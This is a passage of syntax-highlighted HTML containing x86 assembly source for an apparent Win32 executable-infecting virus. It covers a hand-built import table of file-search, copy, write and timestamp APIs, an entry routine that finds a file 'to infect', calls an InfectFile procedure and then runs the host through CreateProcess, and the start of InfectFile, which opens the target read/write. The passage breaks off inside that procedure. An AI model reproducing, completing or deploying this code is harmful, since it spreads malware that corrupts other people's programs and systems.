</span><span class="sc5">Create</span><span class="sc0">          </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">FUNC6</span><span class="sc0">  </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">PEheader</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">LoadAT</span><span class="sc0">
</span><span class="sc5">FileP</span><span class="sc0">           </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">FUNC7</span><span class="sc0">  </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">PEheader</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">LoadAT</span><span class="sc0">
</span><span class="sc5">Read</span><span class="sc0">            </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">FUNC8</span><span class="sc0">  </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">PEheader</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">LoadAT</span><span class="sc0">
</span><span class="sc5">Write</span><span class="sc0">           </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">FUNC9</span><span class="sc0">  </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">PEheader</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">LoadAT</span><span class="sc0">
</span><span class="sc5">Close</span><span class="sc0">           </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">FUNC10</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">PEheader</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">LoadAT</span><span class="sc0">
</span><span class="sc5">FindFirst</span><span class="sc0">       </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">FUNC11</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">PEheader</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">LoadAT</span><span class="sc0">
</span><span class="sc5">FindNext</span><span class="sc0">        </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">FUNC12</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">PEheader</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">LoadAT</span><span class="sc0">
</span><span class="sc5">CloseFind</span><span class="sc0">       </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">FUNC13</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">PEheader</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">LoadAT</span><span class="sc0">
</span><span class="sc5">FileSize</span><span class="sc0">        </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">FUNC14</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">PEheader</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">LoadAT</span><span class="sc0">
</span><span class="sc5">WinEx</span><span class="sc0">           </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">FUNC15</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">PEheader</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">LoadAT</span><span class="sc0">
</span><span class="sc5">GetTime</span><span class="sc0">         </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">FUNC16</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">PEheader</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">LoadAT</span><span class="sc0">
</span><span class="sc5">SetTime</span><span class="sc0">         </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">FUNC17</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">PEheader</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">LoadAT</span><span class="sc0">
                </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">API_LOC2A</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">msgbox</span><span class="sc0">          </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">FUNCA</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">PEheader</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">LoadAT</span><span class="sc0">

                </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">SizeAPIAdd</span><span class="sc0">      </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">API_LOC2</span><span class="sc0">
</span><span class="sc1">;======================================================================</span><span class="sc0">

</span><span class="sc5">API_LOC2b</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">exitpb</span><span class="sc0">           </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">FUNC1</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">PEheader</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">LoadAT</span><span class="sc0">    </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">beepb</span><span class="sc0">            </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">FUNC2</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">PEheader</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">LoadAT</span><span class="sc0">    </span><span class="sc1">;4h</span><span class="sc0">
</span><span class="sc1">;VxdCall0b         DD      80000001h                                  ;8h</span><span class="sc0">
</span><span class="sc5">getcomlineb</span><span class="sc0">      </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">FUNC3</span><span class="sc0">  </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">PEheader</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">LoadAT</span><span class="sc0">    </span><span class="sc1">;Ch</span><span class="sc0">
</span><span class="sc5">createpb</span><span class="sc0">         </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">FUNC4</span><span class="sc0">  </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">PEheader</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">LoadAT</span><span class="sc0">    </span><span class="sc1">;10h        </span><span class="sc0">
</span><span class="sc5">Copyb</span><span class="sc0">            </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">FUNC5</span><span class="sc0">  </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">PEheader</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">LoadAT</span><span class="sc0">
</span><span class="sc5">Createb</span><span class="sc0">          </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">FUNC6</span><span class="sc0">  </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">PEheader</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">LoadAT</span><span class="sc0">
</span><span class="sc5">FilePb</span><span class="sc0">           </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">FUNC7</span><span class="sc0">  </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">PEheader</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">LoadAT</span><span class="sc0">
</span><span class="sc5">Readb</span><span class="sc0">            </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">FUNC8</span><span class="sc0">  </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">PEheader</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">LoadAT</span><span class="sc0">
</span><span class="sc5">Writeb</span><span class="sc0">           </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">FUNC9</span><span class="sc0">  </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">PEheader</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">LoadAT</span><span class="sc0">
</span><span class="sc5">Closeb</span><span class="sc0">           </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">FUNC10</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">PEheader</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">LoadAT</span><span class="sc0">
</span><span class="sc5">FindFirstb</span><span class="sc0">       </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">FUNC11</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">PEheader</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">LoadAT</span><span class="sc0">
</span><span class="sc5">FindNextb</span><span class="sc0">        </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">FUNC12</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">PEheader</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">LoadAT</span><span class="sc0">
</span><span class="sc5">CloseFindb</span><span class="sc0">       </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">FUNC13</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">PEheader</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">LoadAT</span><span class="sc0">
</span><span class="sc5">FileSizeb</span><span class="sc0">        </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">FUNC14</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">PEheader</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">LoadAT</span><span class="sc0">
</span><span class="sc5">WinExb</span><span class="sc0">           </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">FUNC15</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">PEheader</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">LoadAT</span><span class="sc0">
</span><span class="sc5">GetTimeb</span><span class="sc0">         </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">FUNC16</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">PEheader</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">LoadAT</span><span class="sc0">
</span><span class="sc5">SetTimeb</span><span class="sc0">         </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">FUNC17</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">PEheader</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">LoadAT</span><span class="sc0">
                 </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">API_LOC2Ab</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">msgboxb</span><span class="sc0">          </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">FUNCA</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">PEheader</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">LoadAT</span><span class="sc0">

                 </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc1">;------------------------names of DLL         </span><span class="sc0">

</span><span class="sc5">DLL1</span><span class="sc0">    </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc12">'KERNEL32.DLL'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">DLLA</span><span class="sc0">    </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc12">'USER32.DLL'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">               </span><span class="sc1">;ends dll names</span><span class="sc0">

</span><span class="sc5">FUNC1</span><span class="sc0">   </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'ExitProcess'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">FUNC2</span><span class="sc0">   </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc12">'Beep'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">FUNC3</span><span class="sc0">   </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc12">'GetCommandLineA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">FUNC4</span><span class="sc0">   </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'CreateProcessA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
 
</span><span class="sc5">FUNC5</span><span class="sc0">   </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'CopyFileA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
  
</span><span class="sc5">FUNC6</span><span class="sc0">   </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'CreateFileA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
 
</span><span class="sc5">FUNC7</span><span class="sc0">   </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'SetFilePointer'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
  
</span><span class="sc5">FUNC8</span><span class="sc0">   </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'ReadFile'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
   
</span><span class="sc5">FUNC9</span><span class="sc0">   </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'WriteFile'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    
</span><span class="sc5">FUNC10</span><span class="sc0">  </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'CloseHandle'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">FUNC11</span><span class="sc0">  </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'FindFirstFileA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">FUNC12</span><span class="sc0">  </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'FindNextFileA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">FUNC13</span><span class="sc0">  </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'FindClose'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">FUNC14</span><span class="sc0">  </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'GetFileSize'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">FUNC15</span><span class="sc0">  </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'WinExec'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">FUNC16</span><span class="sc0">  </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'GetFileTime'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">FUNC17</span><span class="sc0">  </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'SetFileTime'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">


        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">                       </span><span class="sc1">;end of Function list for this DLL</span><span class="sc0">


</span><span class="sc5">FUNCA</span><span class="sc0">   </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'MessageBoxA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">               </span><span class="sc1">;end the function list</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">               </span><span class="sc1">;end the DLL list</span><span class="sc0">


</span><span class="sc5">EndIDATA</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;By Default this will be R/W Exec section</span><span class="sc0">
</span><span class="sc5">Begin</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc1">;move the header into our section</span><span class="sc0">
       </span><span class="sc1">;really so this is info will be R\W </span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">VSize</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">           </span><span class="sc1">;Need any value in our address</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">Eax</span><span class="sc0">             </span><span class="sc1">;area for GetMZ</span><span class="sc0">
        </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">GetMZ</span><span class="sc0">           </span><span class="sc1">;Eax will return pntr to MZ header</span><span class="sc0">
        </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">Esi</span><span class="sc4">,</span><span class="sc8">Eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">Edi</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">PEheader</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc2">6</span><span class="sc0">            </span><span class="sc1">;600 bytes </span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">



       </span><span class="sc1">;***Get CommandLine</span><span class="sc0">
        </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">FillFileNames</span><span class="sc0">        
   
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">Eax</span><span class="sc4">,</span><span class="sc8">Eax</span><span class="sc0">         </span><span class="sc1">;Eax = Zero then no file to infect or run</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">NoFileToExec</span><span class="sc0">

 
        </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">InfectFile</span><span class="sc0">

        </span><span class="sc9">IFDEF</span><span class="sc0"> </span><span class="sc5">DEBUG</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">Eax</span><span class="sc0"> 
                </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">msgbox</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">large</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">EXEcName</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">FileName</span><span class="sc4">,</span><span class="sc10">Large</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">Eax</span><span class="sc0">
        </span><span class="sc9">ENDIF</span><span class="sc0">

        </span><span class="sc1">;this could be used but to failed in one test in winnt</span><span class="sc0">
        </span><span class="sc1">;CALL    WinEx, Offset EXEcName, large 1</span><span class="sc0">
        </span><span class="sc1">;there was probaly another issue here</span><span class="sc0">
 
        </span><span class="sc1">;Run the file using CreateProcess</span><span class="sc0">
                 </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">createp</span><span class="sc4">,</span><span class="sc0">       \
                 </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">FileName</span><span class="sc4">,</span><span class="sc0">       \   </span><span class="sc1">;module name</span><span class="sc0">
                 </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">EXEcName</span><span class="sc4">,</span><span class="sc0">       \   </span><span class="sc1">;command line</span><span class="sc0">
                 </span><span class="sc10">large</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">               \   </span><span class="sc1">;sec attr</span><span class="sc0">
                 </span><span class="sc10">large</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">               \   </span><span class="sc1">;thread sec</span><span class="sc0">
                 </span><span class="sc10">Large</span><span class="sc0"> </span><span class="sc5">False</span><span class="sc4">,</span><span class="sc0">           \   </span><span class="sc1">;inherit handles</span><span class="sc0">
                 </span><span class="sc10">large</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">               \   </span><span class="sc1">;create flags</span><span class="sc0">
                 </span><span class="sc10">large</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">               \   </span><span class="sc1">;Enviroment</span><span class="sc0">
                 </span><span class="sc10">large</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">               \   </span><span class="sc1">;current directory</span><span class="sc0">
                 </span><span class="sc9">offset</span><span class="sc0">  </span><span class="sc5">StartupInfo</span><span class="sc4">,</span><span class="sc0">   \   </span><span class="sc1">;startup info</span><span class="sc0">
                 </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ProcessInfo</span><span class="sc0">        </span><span class="sc1">;process info</span><span class="sc0">
                 </span><span class="sc6">jmp</span><span class="sc0">    </span><span class="sc5">ExitMain</span><span class="sc0">

</span><span class="sc5">NoFileToExec</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">Eax</span><span class="sc0"> 
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">msgbox</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">large</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">BodyMsg</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">BodyTitle</span><span class="sc4">,</span><span class="sc10">Large</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">Eax</span><span class="sc0">
                                
</span><span class="sc5">Problem</span><span class="sc4">:</span><span class="sc0">
        
</span><span class="sc5">NoCommandLine</span><span class="sc4">:</span><span class="sc0">
                
</span><span class="sc5">ExitMain</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">exitp</span><span class="sc0">
</span><span class="sc1">;------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">InfectFile</span><span class="sc0">      </span><span class="sc9">PROC</span><span class="sc0">
                </span><span class="sc6">PushA</span><span class="sc0">

</span><span class="sc1">;Open the File r/w using Create file</span><span class="sc0">

        </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Create</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0">           \
                </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">FileName</span><span class="sc4">,</span><span class="sc0">               \</span><span class="sc1">;File to Open</span><span class="sc0">
                </span><span class="sc5">GENERIC_READ</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc5">GENERIC_WRITE</span><span class="sc4">,</span><span class="sc0"> \
                </span><span class="sc10">large</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">                       \
                </span><span class="sc10">Large</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">                       \
                </span><span class="sc10">large</span><span class="sc0"> </span><span class="sc5">OPEN_EXISTING</span><span class="sc4">,</span><span class="sc0">           \
                </span><span class="sc10">large</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">                       \
                </span><span class="sc10">large</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                        

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">fHandle</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">Eax</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">@@FileNotOpenErr</span><span class="sc0">
                </span><span class="sc1">;fBuff where to read info to</span><span class="sc0">

